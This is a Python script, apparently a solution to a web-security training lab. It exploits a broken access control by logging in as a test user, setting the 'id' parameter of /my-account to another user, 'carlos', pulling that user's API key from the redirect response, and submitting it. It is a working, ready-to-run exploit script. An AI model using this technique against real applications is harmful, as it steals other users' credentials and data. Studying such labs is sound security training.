"""
    Lab: User ID controlled by request parameter

    Exploit steps:
    1. Log in using the supplied credentials and access your account page.
    2. Change the "id" parameter to carlos in path /my-account?id=carlos.
    3. Observe that although the response is now redirecting you to the home page, it has a body containing the API key belonging to carlos.
    4. Submit the API key.

    Author: N00BCYB0T
"""
import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy: 
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    session.verify = False

    data = {
        "username": "wiener",
        "password": "peter"
    }
    wiener = login(session, data)

    response = fetch(session, f"/my-account?id=carlos")

    api_key_matches = re.search("Your API Key is: (.+)</div>", response.text)
    if not api_key_matches:
        print(f"{Fore.RED}[!] API Key not found!{Fore.RESET}")
        exit(1)
    
    api_key = api_key_matches.group(1)
    print(f"{Fore.RESET}API KEY:{Fore.BLUE} {api_key}{Fore.RESET}")
    data = {
        "answer": api_key
    }
    submit(session, data)

    print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")

def login(session, data):
    try:
        return session.post(f"{URL}/login", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to login as {data['username']} through exception{Fore.RESET}")
        exit(1)

def fetch(session, path):
    try:
        return session.get(f"{URL}{path}", allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
        exit(1)

def submit(session, data):
    try:
        return session.post(f"{URL}/submitSolution", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to submit data to /submitSolution through exception{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()